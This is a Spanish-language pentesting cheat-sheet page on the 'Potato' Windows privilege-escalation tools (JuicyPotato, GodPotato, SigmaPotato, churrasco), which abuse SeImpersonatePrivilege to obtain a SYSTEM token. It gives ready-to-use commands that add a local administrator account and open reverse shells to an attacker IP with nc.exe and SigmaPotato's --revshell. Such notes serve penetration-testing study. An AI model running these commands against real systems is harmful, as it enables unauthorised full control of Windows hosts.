---
title: Familia Potato (JuicyPotato / GodPotato / SigmaPotato / churrasco)
resumen: Binarios que abusan de SeImpersonatePrivilege vía DCOM/RPC para robar un token de SYSTEM.
tags: privilege-escalation
---

Distintas implementaciones de la misma idea: forzar a un servicio con token de `SYSTEM` (a través de DCOM/RPC) a autenticarse contra un listener local controlado por el atacante, y capturar ese token para ejecutar comandos como `NT AUTHORITY\SYSTEM`. Todas requieren `SeImpersonatePrivilege` (o `SeAssignPrimaryToken`) activo en la cuenta actual — compruébalo siempre primero:

```powershell
whoami /priv
```

## JuicyPotato

La más antigua y configurable; requiere elegir un **CLSID** válido para la versión de Windows objetivo (parcheada en las versiones más recientes de Windows Server, por eso hoy en día se prefiere GodPotato/SigmaPotato).

> [github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

```
-t <tipo>   t = CreateProcessWithTokenW (requiere SeImpersonate)
            u = CreateProcessAsUser (requiere SeAssignPrimaryToken)
            * = prueba ambos métodos
-p <binario>   binario a ejecutar
-l <puerto>    puerto de escucha del servidor COM
-m <IP>        IP de escucha (por defecto 127.0.0.1)
-a <arg>       argumentos para el binario de -p
-c <CLSID>     CLSID de Windows a explotar
-i             consola interactiva (solo con CreateProcessAsUser)
```

```bash
# Crear un usuario administrador
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user userAdmin Password123 /add" -l 1337

# Reverse shell especificando CLSID
JuicyPotato.exe -t * -p C:\Tools\nc.exe -a "10.10.10.10 4444 -e cmd.exe" -l 1337 -c "{7A173401-5260-11D1-8592-00C04FC295EE}"
```

## GodPotato

Explota un fallo en cómo `RPCSS` maneja OXID; a diferencia de las Potato antiguas (parcheadas), sigue funcionando porque el fallo real está en un servicio obligatorio sin corrección completa. Funciona en **Windows Server 2012 a 2022** (y Windows 8 a 11), sin necesitar CLSID específico por versión — ideal tras un foothold como cuenta de servicio web o de base de datos (IIS, SQL).

> [github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

## SigmaPotato

Evolución de GodPotato, con builds para .NET 4+ (`SigmaPotato.exe`) y .NET 2.0 (`SigmaPotatoCore.exe`) para máxima compatibilidad. Igual que las anteriores, se apoya en `SeImpersonatePrivilege`.

> [github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)

```bash
# Ejecutar un comando puntual como SYSTEM
./SigmaPotato.exe '<comando>'

# Reverse shell directa
./SigmaPotato.exe --revshell <IP> <puerto>
```

## churrasco

Alternativa clásica para versiones de Windows (Server 2003) donde JuicyPotato no tiene CLSID disponible. Si no recuerdas la sintaxis, el propio binario la muestra al ejecutarlo sin argumentos.

```bash
churrasco.exe "comando"
```

### Técnicas donde aparece

[[token-kidnapping]]
